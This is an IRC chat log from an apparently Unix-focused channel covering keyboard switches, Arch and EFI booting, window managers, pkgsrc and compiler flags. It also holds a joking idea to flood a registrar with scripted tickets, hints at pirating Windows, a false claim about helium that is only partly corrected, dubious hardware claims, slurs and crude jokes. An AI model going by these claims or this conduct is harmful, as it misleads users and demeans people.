05:01  thang1thang │  I like the ultra minimal appeal tbh
05:01  thang1thang │  more than LEDs
05:01         dcat │  yeah, optional
05:01         dcat │  just have the holes there
05:01         dcat │  if you want it, you can buy a led, and just push it in there
05:01         dcat │  instead of having to buy a new keyboad if you want leds
05:01         vosh │  +circuit
05:02  thang1thang │  circuitry will add a great deal of complexity to the keyboard
05:02  thang1thang │  and it'll make the filter 10x harder to implement well
05:02         vosh │  true
05:02         dcat │  yeah
05:03         dcat │  anybody wanna join in on this project?
05:04         dcat │  like, actually help with design and ideas?
05:05         vosh │  sry, have to leave and get some sleep.. 5am here
05:05         vosh │  take care guys 
05:05  thang1thang │  I'd be willing to do some design/ideas and stuff, I guess, but I don't know how useful I'd actually be lol
05:05         vosh │  bye
05:05  thang1thang │  have fun man
05:05         quit │  vosh
05:05         dcat │  night
05:06         dcat │  thang1thang2: where are you from?
05:06         kori │  dcat: what switches are you going to use?
05:06         dcat │  cherry mx
05:07         kori │  hmmm
05:07  thang1thang │  Oregon, USA
05:07         dcat │  I'm not such a fan of topre and all
05:07  thang1thang │  so 8pm here
05:07         dcat │  cool
05:07         dcat │  my gf is from bend
05:07  thang1thang │  that's awesome
05:07  thang1thang │  I live just 3 hours from bend
05:07         dcat │  so what, portland?
05:08         kori │  dcat: I actually have a rubber dome
05:08  thang1thang │  yeah about an hour from portland
05:08         kori │  and I'm sure topre switches would be really expensive
05:08  thang1thang │  I'm like sideways from portland so I'm about an hour from portland, hour from salem
05:08         dcat │  kori: I'm not much for rubber dome ;P
05:08         kori │  yeah
05:08         kori │  I want to get a Poker II
05:09  thang1thang │  only $120 nice
05:09  thang1thang │  6 key rollover :(
05:10         dcat │  I'm actually basing most of my design ideas on poker ii, hhkb, and model m
05:10         dcat │  so cool
05:14         dcat │  guys
05:14  thang1thang │  mm?
05:15         dcat │  which cherry mx flavour would you prefer?
05:15  thang1thang │  I prefer escape as the capslock key rather than control in the escape position like the hhkb has i
05:15  thang1thang │  and they have diff flavours?
05:15         kori │  dcat: blues
05:15         dcat │  I was thinking of going with either blues or clears
05:15         kori │  blues
05:15        tbuck │  i have browns. want to try blues
05:16  thang1thang │  oooh okay nvm I got it mixed up
05:16  thang1thang │  yeah I like reds tbh
05:17         dcat │  I have blues on my current keyboard
05:17         dcat │  but from what I understand, clears are best for long-term
05:17       fenriz │  i has red
05:17       fenriz │  returned my browns cuz they felt weird.
05:18  thang1thang │  clears are only best becaues they're stiffer than brown
05:18  thang1thang │  and best is really arbritrary
05:18  thang1thang │  they're the same exact design as brown, just 65cN rather than 45 lol
05:18       fenriz │   brb
05:19       fenriz │  gonna play some doto2
05:19  thang1thang │  if anything reds would be the best for longlivitiy due to 45cN so they need less force
05:19         dcat │  japanese version of dota?
05:19  thang1thang │  and no click or bump or anything
05:19  thang1thang │  so least resistance, wear and tear, etc
05:19         dcat │  yeah, I meant long-term as in ergonomical
05:20  thang1thang │  ergonomical would def be red then imo
05:20  thang1thang │  45cN vs 65cN is a LOT over time
05:21         dcat │  it stops/helps you from bottoming out
05:21  thang1thang │  ooh didn't think about that
05:21  thang1thang │  I always bottom out on everything and it never hurts me because I do gymnastics and rock climb enough that my fingers are prety damn strong
05:21         dcat │  hm
05:22  thang1thang │  but at the same time I don't really bottom out hard enough to slam into the keyboard because I know how much travel my keyboard has
05:22         dcat │  yeah
05:22  thang1thang │  if you want to type like a pro though
05:23  thang1thang │  get a keyboard with n-key rollover
05:23  thang1thang │  learn stenographic typing :p
05:23         dcat │  lel
05:23         dcat │  yeah, I'll add NKO
05:23         dcat │  a keyboard never needs to be replaced
05:23         dcat │  it never has to change
05:24         dcat │  it's weird that we use such shitty quality products for it
05:24  thang1thang │  yeah
05:24  thang1thang │  it's 'cause they're cheap as hell
05:24         dcat │  yeah
05:24         dcat │  I wanna make something against that norm
05:24  thang1thang │  yeah, it sounds legit
05:24         dcat │  something that's relatively expensive, but can be passed on for generations
05:24  thang1thang │  I actually wanna rebuild my laptop
05:24  thang1thang │  that sounds so freaking lame but I do
05:25  thang1thang │  I wanna put custom aluminum keys on it
05:25         dcat │  why's that lame?
05:25  thang1thang │  replace the bottom panel since it's warped from usage
05:25  thang1thang │  and put a second hard drive in it since I had to take out the dvd drive
05:25         dcat │  that sounds rad
05:25  thang1thang │  Because who customizes their laptop like they would rebuild a car?

05:29  thang1thang │  has to do with the culture
05:29  thang1thang │  there's the whole "keep portland wierd" thing
05:29  thang1thang │  oregon used to be a huuuuuuuge hippie place as well
05:29         vypr │  oh noews

05:29         vypr │  :c
05:29         dcat │  :<
05:29  thang1thang │  and then the 80s with the skinhead and punk culture morphed in and the large acceptance of the place just allowed it to dominate
05:29         vypr │  Did Spotify already come out with mobile streaming for free?
05:30         vypr │  I know they were gonna to.

06:01  thang1thang │  Osx mavericks? Only other distribution I ever ran was on a Mac mini and it was puppy Linux I think 
06:02       fenriz │  damn
06:02       fenriz │  and you divin straight into arch, nice.
06:02       fenriz │  i was wasting so much time on mint
06:02         dcat │  thang1thang2: what bootloader are you using?
06:03  thang1thang │  Just plain ass bootloader from OS X. It's efi so it works just fine from what I've heard 
06:03       fenriz │  i think yo uwill be forced to pick one
06:03       fenriz │  sys or grub i thnk
06:03         dcat │  no.
06:03       fenriz │  no?
06:04         dcat │  you need an open efi bootloader
06:04         dcat │  grub and syslinux are bios, aren't they?
06:04       fenriz │  is efi and uefi different?
06:04       fenriz │  hang on, there are bios bootloaders and other ones?
06:04         dcat │  yes.
06:04         dcat │  EFI
06:05       fenriz │  so in a linux boot sequence there is a BIOS bootloader, and an EFI bootloader?
06:05         dcat │  BIOS || EFI
06:05         dcat │  ! BIOS && EFI
06:06         BigE │  or, you know, just XOR it
06:06       fenriz │  aah i see
06:06       fenriz │  so in thang1thang2 's case, since his laptop has EFI he needs to use an EFI one?
06:07         dcat │  BigE: yeah, but there isn't any uniform operator for that ;P
06:07         dcat │  most people wouldn't get BIOS ^ EFI
06:08         BigE │  last I checked you can do xor in C

06:08         dcat │  yes, ^
06:08         BigE │  you can also use 'xor'

06:40       fenriz │  so that looks kinda promising.
06:41         dcat │  yup
06:41       fenriz │  that means that it IS sourcing my rc?
06:42         dcat │  yes

06:43         dcat │  what's happening?

06:44         dcat │  what is it, a notification daemon?

07:01       fenriz │  what for?
07:02         BigE │  too bad USB sticks are so expensive
07:02         BigE │  \s
07:02  thang1thang │  Because I didn't partition the first one into two partitions and i have to write the bootloader file to a disk on the USB because I need to boot Into OS X

08:42  thang1thang │  I saw some stuff about that
08:42  thang1thang │  apparently it's hell to use when you're managing large projects
08:42  thang1thang │  but I don't see that being a problem for something like our small git thing. Doesn't seem like a huge company would use it :p
08:42         vypr │  I don't expect it to.
08:43         vypr │  And it shouldn't be a problem for large projects.
08:43  thang1thang │  yeah just pointing it out, not that it's something that actually concerns anyone

08:49  thang1thang │  went from ~212G to ~50G on my os x partition by getting rid of all the crap I don't need
08:50  thang1thang │  I'm finding that as I'm getting older
08:50  thang1thang │  I use less and less stuff on my computer
08:50  thang1thang │  "oh microsoft word, bull shit. I use vim"
08:50  thang1thang │  don't need powerpoint stuff
08:50  thang1thang │  or even excel/access stuff anymore
08:51  thang1thang │  I'm moving to more and more CLI stuff and the amount of storage I take up on my computer is dropping insanely fast 'cause I don't even really keep media on it anymore
08:51  thang1thang │  it's interesting, I guess, to see the change.
08:53         vypr │  Network Solutions is shit.
08:53  thang1thang │  network solutions?
08:53         vypr │  I wanna delete my domain, their reply "create another help ticket to get it deleted.".
08:54  thang1thang │  wat
08:54         vypr │  I create another ticket, "you'll have to call us to get it deleted.".
08:54         vypr │  Fuck you, Network Solutions.
08:54  thang1thang │  make a script to create tickets
08:54  thang1thang │  send 'em about 15,000
08:54         vypr │  lul
08:54         vypr │  That would get my domain gone for sure.
08:54  thang1thang │  damn straight it would
08:54  thang1thang │  teach 'em to fuck with programmers
08:55         dcat │  I agree.
08:55  thang1thang │  but really how hard would it even be to do that script?

09:10  thang1thang │  tiny webservers
09:10  thang1thang │  the hell is µhttpd even going to be used for anyway?
09:10         vypr │  i dunno

09:18        z3bra │  +g
09:18        z3bra │  what do you mean ?
09:18  thang1thang │  yeah, you plug it into a dildo or a usb drive or anything
09:18  thang1thang │  and it'll install linux onto it
09:18  thang1thang │  really nice if you wanna grep orgasms
09:18        z3bra │  hehe
09:19        z3bra │  find -name '.g' -exec touch {} \;

09:20        z3bra │  like what ?
09:21        venam │  it's a webserver that tracks a server status so you can add different status to follow
09:22        venam │  we got a unixhub git so why not get the unixhub email back?
09:22         vypr │  Well, I'm in charge of the UnixHub Git.
09:22         vypr │  So, there's that.
09:22         vypr │  You'll have to talk to Neo or Jayro about that.
09:23        z3bra │  venam, okay
09:23        z3bra │  maybe you can build your own mail server, and add share it with the community
09:23        venam │  from what I know they don't intend to host the email on their servers
09:23         vypr │  Last time I made a mail server, it flucked up in the long run.
09:24         vypr │  Not entirely sure how it did, either.
09:24  thang1thang │  lol
09:25  thang1thang │  fecking hell I hate time machine
09:25  thang1thang │  "backing up 40GB of data... an hour remaining" it's at 9GB and been running for 30 minutes at least -_-
09:26        venam │  it's pretty cool that the UH git automatically has a public area with all the project from UH members
09:26         vypr │  Well, it has a public area with all the projects that the users have made public.
09:27         vypr │  There's a little bit of private repos.
09:27        venam │  why use private repo if it's open source
09:27         vypr │  I don't make the private repos, I just host them.
09:28         vypr │  I'm not gonna disclose what repos are private and who is owning them.

09:30  thang1thang │  that's 53G in size

09:43  thang1thang │  yeah
09:44  thang1thang │  anything you breathe in gets circulated through out the body
09:44  thang1thang │  if you have a bubble of non air-gas that's large enough
09:44  thang1thang │  it'll immediately kill the brain
09:44        z3bra │  not sure to get it
09:44  thang1thang │  especially something as light as helium. Air isn't light so it has a certain pressure, but helium has way less pressure and it'll do some damn awful things to your brain
09:45        z3bra │  if I empty my lungs, then breathe in a ballon, i'll die ?
09:45  thang1thang │  instantly
09:45        z3bra │  I did it yesterday
09:45        venam │  what a beautiful way to end your life
09:45  thang1thang │  o.O emptying your lungs, and breathing in an entire breath of helium?
09:45        z3bra │  yeah
09:45  thang1thang │  weird. You shouldn't have survived that... lemme google it again, perhaps I read the information wrong
09:46        z3bra │  maybe i'm just a Xmen

09:47  thang1thang │  breathing in helium doesn't immediately kill you
09:48    superlung │  no, he was right
09:48  thang1thang │  it simply doesn't allow you to breathe in air at the same time
09:48    superlung │  I'm just overpowered
09:48  thang1thang │  so if you breathe in ENOUGH, you won't get enough air into your brain, and you'll die
09:48    superlung │  thang1thang22, yeah sure
09:48  thang1thang │  but your brain can go 4 mins without oxygen so you don't have to worry from a single breath :p
09:48    superlung │  after 4/5 full ballons, my head started turning
09:49    superlung │  4-5
09:49  thang1thang │  oh those fucking idiots...
09:49  thang1thang │  they forced a girl to breathe helium to make her talk funny
09:49  thang1thang │  but they did it from a pressurized tank...
09:50    superlung │  sprotch.
09:50  thang1thang │  it caused an obstruction in her blood vessels
09:50  thang1thang │  and killed her

10:17   emptytapes │  z3bra: It's quite confusing but it's really good for MIDI which what I use the most
10:17  thang1thang │  empty, what do you actually do on windows?
10:17        z3bra │  sounds :p
10:18  thang1thang │  well yeh, figured
10:18        z3bra │  emptytapes, he uses the default sounds actually
10:18   emptytapes │  Either browse or use all my audio stuff, the only reason I use windows on my desktop is for ableton
10:18   emptytapes │  Linux audio sucks
10:18  thang1thang │  no coding or anything? I'll probably have to put some coding stuff on windows again ;-;
10:18   emptytapes │  Not really, I don't have much interest in coding
10:18        z3bra │  I read somewhere that ableton runs good through wine
10:18   emptytapes │  I prefer hardware stuff :)
10:18  thang1thang │  wine is... troublesome to set up lol
10:18        z3bra │  not real
10:18   emptytapes │  yeah.. I'd rather not use WINE
10:18        z3bra │  really
10:19  thang1thang │  well in theory it's not troublesome to set up
10:19  thang1thang │  but the more the program needs to read external files or whatever
10:19  thang1thang │  the fuckier it gets
10:19        z3bra │  WINEPREFIX=~/var/wine/softname wine setup.exe
10:19  thang1thang │  and it's just... bah
10:19   emptytapes │  especially when DAWs write to RAM constantly
10:19        z3bra │  but yeah, I dislikes using wine

10:28  thang1thang │  >mfw in the time it took you to ask me what it was, you could've typed in the damn url
10:28   emptytapes │  I did type it in

10:30  thang1thang │  lol
10:30  thang1thang │  why?
10:31   emptytapes │  My HDD is sos 
10:31   emptytapes │  slowww
10:31  thang1thang │  is it broken or something?
10:31  thang1thang │  or are you just used to SSD
10:31   emptytapes │  It's just terrible and old
10:31  thang1thang │  you realize new HDDs have read and write speeds of like 80MB/s+ right?
10:32   emptytapes │  SSD have 500 Mb/s read/write though
10:32  thang1thang │  yeah they do
10:32  thang1thang │  but new HDDs aren't "that bad" at all
10:32  thang1thang │  SSDs are pretty damn awesome for music media though with all the read/writ operations you gotta do
10:33   emptytapes │  this isn't new, it is about 4 years old
10:33  thang1thang │  ah I'm sorry

10:41         yrmt │  did vosh manage OpenBSD ?
10:42  thang1thang │  pretty sure he's got it working fairly good
10:42  thang1thang │  me on the other hand have practically had it with os x
10:42  thang1thang │  finishing up my prelim backup now and I'm going to bork the whole computer and main install arch
10:42         yrmt │  heh, osx isn't that easiest platform to unix things
10:43         yrmt │  that's how I learned
10:43  thang1thang │  yeah
10:43  thang1thang │  it's just... fuck man
10:43  thang1thang │  if someone says "hey wanna test something otu"
10:43  thang1thang │  I can say "sure" but 99% of the time it's not gonna work -_-
10:43  thang1thang │  and the worst part is X11 isn't a emulator or anything
10:44  thang1thang │  but I've gotten some stuff to work in x11 that doesn't work outside of x11
10:44  thang1thang │  so I sound like a fucking idiot saying "no wait let me try that in x11"
10:44         yrmt │  most things just werk
10:44  thang1thang │  some types of programs can't compile in os x
10:44         yrmt │  you just have to understand the basic stuff like makefiles, compiler options
10:44        venam │  does gtk works by default on OSX
10:44  thang1thang │  or rather some types of programs don't run
10:44  thang1thang │  gtk that's the one that fucked me over
10:45         yrmt │  venam: yep, I have the latest gtk2/gtk3
10:45         yrmt │  qt3/qt4 also work
10:45         yrmt │  everything should work
10:45  thang1thang │  I couldn't get gtk2 on mine for some reason...

10:46         yrmt │  thang1thang22: don't give up
10:46         yrmt │  learning from osx makes linux/bsd easy
10:46  thang1thang │  lol
10:46         yrmt │  especially freebsd
10:46        z3bra │  in what means ?
10:46  thang1thang │  okay but still

10:47         quit │  nyx
10:47  thang1thang │  when I run into something I can't do on linux I'll probably get windows back on here since W8 can boot straight from EFI
10:47   emptytapes │  I would so install linux on my set up if it had decent audio
10:47  thang1thang │  the one thing windows 8 fixed that made me so happy is it boots direct from EFI now. I don't even need bootcamp anymore
10:47        z3bra │  there is nothing you CAN'T do on linux
10:48        z3bra │  only things you can't do THIS or THAT way
10:48  thang1thang │  I mean, I use the bootcamp download thingey for drivers
10:48  thang1thang │  true enough, z3bra
10:48  thang1thang │  I was forced to use windows for programming for my final project
10:48        venam │  VB.NET?
10:48  thang1thang │  because I had to use the winBGIm graphics library
10:48        venam │  worse
10:48  thang1thang │  ikr?
10:49  thang1thang │  I wanted to use a more modern library, we weren't doing anything hard
10:49        z3bra │  fltk
10:49         yrmt │  z3bra: because osx makes it hard to compile stuff sometimes
10:49        z3bra │  \o/
10:49  thang1thang │  but the rest of the team (fuck teams) all had windows so they were just like "meh let's just do it in winBGIm"

10:51  thang1thang │  wget?
10:51  thang1thang │  jk
10:51        venam │  I've learned to not work with team for univ projects
10:51  thang1thang │  but why do you need to torrent?
10:51        z3bra │  emptytapes, i used azureus
10:51        venam │  it always turns out bad
10:51        z3bra │  not light thouhg
10:51  thang1thang │  And i didnt have a choice :(
10:51   emptytapes │  I want a copy of windows 8.1
10:51  thang1thang │  it was like 30% of my grade lol
10:51  thang1thang │  DreamSpark :D
10:51  thang1thang │  I get my W8 for fwee
10:52   emptytapes │  ;_;
10:52  thang1thang │  but really, I use uTorrent and i just get a 2.x.x version
10:52  thang1thang │  before they added all the useless shit
10:52  thang1thang │  it's fairly lightweight tbh
10:52  thang1thang │  might try to find some windows 8 on Usenet so you don't need torrent?
10:53  thang1thang │  or on an open directory? :p
10:53        venam │  why windows 8 when you can get 9
10:53  thang1thang │  there's no such thing as windows 9 yet ._.
10:54  thang1thang │  8.1 is much better than 8, but it's not 9 lol
10:54        venam │  ^~^
10:54        venam │  then wait until 9 gets out
10:54   emptytapes │  windows 9 is coming next year isn't it?
10:54  thang1thang │  I'd be surprised if it was
10:54  thang1thang │  susprised if it wasn't
10:55        venam │  windowsX soon to come
10:55  thang1thang │  Windows X: Vagina
10:55        venam │  I had a bad experience with windows8
10:55  thang1thang │  this time, instead of us screwing you, you can screw us ;)
10:55  thang1thang │  then 10 versions later
10:56        venam │  I don't quite like the separation between app/programs
10:56  thang1thang │  Windows X.10: Dick
10:56  thang1thang │  now it's our turn to screw you
10:56  thang1thang │  And meh. Windows 8's nice for what it does. All the programs you'll ever use are already in the "old" side of windows
10:56        venam │  thang1thang22: how old are you
10:56  thang1thang │  I'm 12 and what is this place, how did I get here, where's my mommy
10:57         yrmt │  huehue
10:57        venam │  that might explain your genitalia jokes
10:57  thang1thang │  I'm just immature at 2am
10:57  thang1thang │  I'll cut it out
10:57         yrmt │  go to sleep
10:57        venam │  you want to
10:57  thang1thang │  but anyway, I was going to say that the start menu side part just becomes an app launcher, really. So just delete every single "window" thing from it, and put only the stuff you'll use and treat it like a quick-menu
10:58   emptytapes │  bbl
10:59  thang1thang │  I want to what?
10:59        venam │  most of those app just load online illicit contents that I didn't want
10:59  thang1thang │  yeah, you can remove them all from the start screen though so meh
11:08   emptytapes │  can I just increase me page file to the reccomended?
11:09  thang1thang │  I don't see any reason why not
11:09  thang1thang │  you have a HDD, increasing page file doens't do anything bad to it
11:09  thang1thang │  turning page file off is risky but can potentially speed up the system by a noticeable amount
11:09   emptytapes │  windows sasys I can have 12261 instead of 8174
11:10   emptytapes │  MB that is
11:10  thang1thang │  yeah, I'd set it at 2.5x recommended amount
11:10   emptytapes │  cool
11:10  thang1thang │  window's recommended value algorithm hasn't changed since windows 95 IIRC
11:10   emptytapes │  Now I need to disable all those unessacery services
11:10  thang1thang │  the hard drive technology on the other hand
11:10  thang1thang │  has changed dramatically :p

11:16       fenriz │  how did your arch install go?
11:16  thang1thang │  I'm gonna do it tomorrow
11:16  thang1thang │  because I got pissy at it
11:16  thang1thang │  and I'm just going to make it the main OS
11:16  thang1thang │  so I don't have to worry about the EFI shit
11:17       fenriz │  which is OSX?
11:17  thang1thang │  yeah, OS X boots from an EFI boot loader
11:17       fenriz │  i see
11:17  thang1thang │  which arch supports, but in order to make os x boot after the install you have to make a bootloader file and make a new partition and bla bla bla
11:17  thang1thang │  whereas if you have one partition that's arch and nothing else in the system, it's just install and go practically

11:20         yrmt │  making a port for bspwm
11:20         yrmt │  I hate when people don't provide tarballs

11:20         yrmt │  yep
11:21  thang1thang │  I love you so much right now
11:21  thang1thang │  when I (inevitably) re-install os x on here that's the first thing I'm putting on there :p
11:21  thang1thang │  bspwm doesn't have a tarball?
11:21         yrmt │  it will be in my pkgin shortly
11:21         yrmt │  thang1thang22: nah, github only
11:21         yrmt │  it's so annoying
11:21  thang1thang │  how are you porting if it doesn't have a tarball?
11:21         yrmt │  and pkgsrc won't let me install from git

11:22       fenriz │  thang1thang22: are you super keen on arch?  or just gona get bswpm on osx then?
11:22         yrmt │  z3bra: I patched the makefile anyway
11:22       fenriz │  btw yrmt what about all those million other tools that bspwm need
11:22       fenriz │  sres, xwininfo
11:22       fenriz │  sxhkd
11:22  thang1thang │  I'm super keen on arch tbh
11:22       fenriz │  i would imagine just bspwm by itself isn't enough
11:22  thang1thang │  I keep running into things I can't do on os x over and over
11:22        z3bra │  arch is good
11:22         yrmt │  fenriz: I'll add them
11:22         yrmt │  lol, bspwm is so bad imo
11:22  thang1thang │  "it just works" is a methodology I've gotten very used to
11:23  thang1thang │  and it works great with OS X... doing os x things. Horrible if you're actually doing unix things
11:23       fenriz │  yrmt: why's that?
11:23         yrmt │  because of all these external tools
11:23         yrmt │  and the config file is weird
11:23       fenriz │  i see what you mean.  i mean if one o fthe tools crap out
11:23       fenriz │  you're kinda screwed.
11:23         yrmt │  and I don't like that it uses a socket
11:23        z3bra │  ^
11:23       fenriz │  but the way baskerville designs is that it is a wm and a wm only
11:23        z3bra │  plan9 style
11:23        z3bra │  :p
11:23         yrmt │  2bwm is much more coherent
11:24       fenriz │  a socket? o_O
11:24  thang1thang │  so I'm going to arch for now, because "it just works" with linux related materials. And then I'll add windows back in when required and then i'll add in os x back in when I'm comfortable with linux
11:24       fenriz │  i never relaly understand what a socket is, i just take for granted that my $BSPWM_SOCKET works.
11:25        z3bra │  fenriz, echo "move window 0X12345 150 200" > /tmp/bspwm.fifo
11:25        z3bra │  a socket is a file you can use to comunicate between two programs

11:40  thang1thang │  "the only major problem with this laptop is that it need a new keyboard... the power button doesn't work... just unscrew the bottom of the laptop and pull out the cover and disconnect the battery, wait a bit, then connect it back and plug in the charger and it'll come on"

11:41       Ypnose │  arf :(
11:41         yrmt │  so, bspwm guys, apart from skhkd what else shoudl I package?
11:41  thang1thang │  I really dislike how gazelle has basically raped the ebay market
11:41         yrmt │  I already have xwininfo
11:43  thang1thang │  mmm tbh I don't know
11:44  thang1thang │  oh wait, to get bspwm running?

11:44         yrmt │  what do bspwm people need
11:44  thang1thang │  do we have dunst so people running a wm can have a notification popup thing?
11:45  thang1thang │  and if bspwm is working on your computer with stuff installed through just pkgin then it should be fine

11:56         yrmt │  so it doesn't use anything else than pkgsrc installed things
11:56  thang1thang │  well that probably explains a lot of thing
11:56         yrmt │  just move /opt to /optbak when building ports
11:56  thang1thang │  >mfw I have /opt/x11...

11:57  thang1thang │  gawddamnit
11:58  thang1thang │  I hate this error
11:58  thang1thang │  If I open up xquartz with cmd + enter it'll go into a crash loop
11:58  thang1thang │  so I need to type xinit 3 into the terminal
11:58  thang1thang │  but the crash loop will continue should I ever cleanly exit x11 -_-

12:38  thang1thang │  http://i.imgur.com/E8ca1R1.jpg
12:38  thang1thang │  You can see the difference because everything's a lot sharper
12:39  thang1thang │  so you can use antialised fonts at like size 10 and they look perfect
12:39  thang1thang │  so you can make everything a lot smaller and it doesn't feel super small
12:39        venam │  when you stay at a reasonable distance from your laptop you won't see this sharpness
12:39  thang1thang │  so you can fit a ton more information in there. Plus, it's a lot more readable at normal sizes
12:39        _pash │  venam: you do
12:39  thang1thang │  not really, you do see the sharpness. I can notice it from arms length
12:39  thang1thang │  it's also really big for photo editing
12:40  thang1thang │  you can edit photos that are like 2500x1400 pixels at 100% size on a freaking 13" screen...
12:40        _pash │  true

12:42         quit │  _pash
12:42  thang1thang │  but get 16G ram and at least 250G of hard drive space
12:43  thang1thang │  if you get anything less than that size of hard drive, apple's trim fucks up and the hard drive isn't full speed so it only runs at ~250MB/s. It's ridiculous
12:43  thang1thang │  and at that speed of SSD, your limiter is mostly ram anyway, so 16GB of ram is like a 3x speed up over 8GB :p
12:44  thang1thang │  my friend was pissed when I told him that 'cause he bought a macbook pro 13" with 4GB ram and the default 128GB hard drive and he was like "so I could've had a computer that's liket 15 times faster for only $200 more?" and I was like "sucks to be you huh?"

14:51        venam │  how do you get your program running on the wii in the first place? does it have a usb port?
14:53      bottomy │  I don't think you run programs on the controller itself (I'd think everything it supports is fixed in firmware and doesn't allow for additional programs to be submitted; e.g. you get the input from it, and send back what you want it to display) but I don't really know anything about it so maybe it does.

14:57      bottomy │  thought you were talking about the controller, since that's what the libdrc is for.
14:57        venam │  yeah but you control a program, and the program is run on the wii, right?
14:57      bottomy │  no
14:57       libbro │  I think we're talking of the controller

14:58      bottomy │  libdrc is just allowing you to communicate with the controller from other systems than the wii
14:58        venam │  so the controler work as a standalone
14:58       libbro │  Yes

15:02      bottomy │  venam: say you have a game on the PC, and want to add the input for movement and expose the menu to the controller's display. you could use that project to do it. for the rendering the menu I'd assume you just render it to an offscreen buffer on the PC then send the current snapshot to the controller to display, and then recieve just generic point of touch locations when they touch the display. which you'd then interpret appropr

17:36         yrmt │  LDFLAGS are for linking the objects together and produce a binary you can run
17:37         yrmt │  CFLAGS are used to point to the right headers and some optiosn

17:38         yrmt │  but you still have to figure out the ldflags for the libraries to link your object fiel

17:40         vosh │  yes
17:40         yrmt │  that's good! it means we compiled bar properly
17:40         yrmt │  now let's link it !
17:40         yrmt │  bar uses only libxcb
17:40         yrmt │  so -L/usr/local/lib -lxcb should be enough
17:40        venam │  yrmt the teacher
17:40         yrmt │  so, ld -L/usr/local/lib -lxcb -o bar bar.o

17:41        venam │  bad  boy

17:41        venam │  joking
17:41         yrmt │  vosh: the thing is you can use clang to do the compiling/linknig at once! like clang -I/usr/local/include -L/usr/local/lib -lxcb -o bar bar.c

00:12        bosko │  yrmt, tl;dr
00:12        bosko │  pascal is fucking homo
00:12        bosko │  and the one true language is C

00:13        bosko │  dcat, never looked into it

00:13         dcat │  you should.
00:14        bosko │  i just stopped caring

00:14         dcat │  http://tour.golang.org/#1
00:14        bosko │  are low level, native and easy to port to various platforms
00:14        bosko │  as well as not depending on any runtime libs
00:14        bosko │  or staticly linking gigantic runtimes
00:15        bosko │  how can I interact with the win32 api in go dcat 
00:15       Ypnose │  bosko: what do you think about shell programming (not talking about specific syntaxes)?
00:15        bosko │  well its not really "programming"
00:15        bosko │  its rather scripting

00:16        bosko │  its respectable
00:16        bosko │  obviously
00:16        bosko │  though if by "shell"
00:16        bosko │  you mean bash
00:16        bosko │  woops not bash
00:16       Ypnose │  no not bash
00:16        bosko │  i meant comspec(cmde.exe)
00:16        bosko │  then die
00:17       Ypnose │  thinking about bourne shell for example
00:17       Ypnose │  or ksh88
00:17        bosko │  i normally just use bourne
00:17        bosko │  dont have time for crap like bash (does anyone)?
00:18        bosko │  ksh seems nice, but never bothered to actualyl get into it
00:18        bosko │  or saw any logical advantages
00:18   emptytapes │  i use zsh
00:18        bosko │  for me
00:18        bosko │  zsh kind of fits into the same category for me
00:18        bosko │  no need, doesnt present any huge advanges over sh
00:18       Ypnose │  depends if you use it interactively or not
00:19        bosko │  yeah
00:19        bosko │  i rarely do
00:19        bosko │  normally just end up opening up an sshv2 session
00:19        bosko │  and then piping some commands over
00:19        bosko │  or executing a script w/e

00:30        bosko │  that people would pay money for
00:30        bosko │  only reason java, c# and related languages exist
00:31        bosko │  is so that software companies can scrape up cs grads
00:31        bosko │  with no programming knowledge
00:31        bosko │  and turn them into code monkeys
00:31        bosko │  with little effort
00:31        bosko │  any tard can program in c#/java etc
00:31        bosko │  and thats great
00:32         BigE │  anyone can code in any language. It takes time and effort to make effective code in any language.
00:33         BigE │  My entire university uses Java for their CS, and it is always blatantly obvious who will be a code monkey and who actually has the critical thinking skills to be successdul
00:33        bosko │  yeah
00:33        bosko │  i feel yeah
00:33        bosko │  yah&
00:33        bosko │  *
00:33         BigE │  because no one gives a shit about your language skills, they want critical thinking skills
00:34         BigE │  any sorry fuck can code in java
00:34         BigE │  same with C, golang, ASM
00:34         BigE │  or any fucking language
00:34        bosko │  yeah
00:34         BigE │  it is the people who, like me, can applywhat they know to a language, regardless of what it is, that succeed and make our way
00:34        bosko │  but people who understand C, asm and all those lower level principles
00:34        bosko │  tend to show the initiative
00:34        bosko │  that the java zombies do not
00:35         BigE │  I agree with that to a certain extent
00:35        bosko │  i really dont understand why java is hot shit though
00:35         BigE │  some of the smartest people I know though dont know a line of C, but produce some amazing fucking shit in Java and Ruby
00:35        bosko │  *no*
00:35        bosko │  yeah
00:36        bosko │  but generally the tards in my cs lectures
00:36        bosko │  are clueles zombies
00:36         BigE │  at a certain point, using a particular language is just adapting to the environment,not useing the best tool for the job/

03:13         BigE │  I have had good luck at Marks

08:40        z3bra │  each time you pop a window you're like "mmmh where will I put it ?

09:05          evo │  Correct
09:05         BigE │  sounds like a plan

11:24  thang1thang │  it's like... 2:25am and I've been working on arch almost all day lol. Took far too long to get it installed, wifi working, etc...
11:25        venam │  what DE/WM did you install?
11:25         yrmt │  venam: I've been struggling with pkgsrc
11:25  thang1thang │  bspwm
11:25         yrmt │  but yeah 2bwm didn't work anyway
11:25         yrmt │  most config values wouldn't be rea
11:25         yrmt │  d
11:26        venam │  have you tried as a standalone?
11:26         yrmt │  yes that works
11:26        venam │  vypr: it reaches 1.4MB and hung up
11:27         vypr │  has to be your connection
11:27   emptytapes │  z3bra: do you think I should run ableton through WINE then?
11:27         vypr │  it works fine for me
11:27        venam │  vypr: have you tried with something big enough?
11:27   emptytapes │  hmm
11:28         vypr │  when i try to push decently large data, it hangs up
11:28        z3bra │  emptytapes, not sure... 
11:28         vypr │  lemme see if there's any limit.
11:28        z3bra │  I'd try to
11:28        z3bra │  especially if it's the last soft you need windows for
11:28        venam │  are you using apache?
11:29         vypr │  nginx
11:29        z3bra │  who runs apache these days ?
11:29        venam │  there might be a limit 
11:29         vypr │  venam: the frontend and the actual git server are two different things.
11:29        venam │  ah yeah that's true
11:30   emptytapes │  I think I'm gonna install FreeBSD in a partition on my desktop, alongside windows
11:31  thang1thang │  do it :D
11:32   emptytapes │  I can't stand using my thinkpad, Ill put dwm on that and 2bwm on desktop set up
11:32  thang1thang │  can't stand using the thinkpad? Isn't that what you have BSD on?
11:33   emptytapes │  yeah, but the screen annoys me
11:33  thang1thang │  lol
11:33   emptytapes │  its a square..
11:33  thang1thang │  and if you're going to put dwm on it, take a gander at bspwm
11:33   emptytapes │  ok :)
11:33  thang1thang │  they're different, but bspwm has some really nice features dwm doesn't have
11:33        z3bra │  take a look at monsterwm instead
11:33  thang1thang │  and yeah square screens sucn ._.
11:34        z3bra │  it's dwm, in lighter, using xcb
11:34  thang1thang │  por que no los dos? :p

11:34   emptytapes │  ooh sounds good
11:35        z3bra │  venam, looks like you'll have to learn how to fedora :p
11:35        venam │  I had nightmares using yum and rpm so I didn't even tried learning it
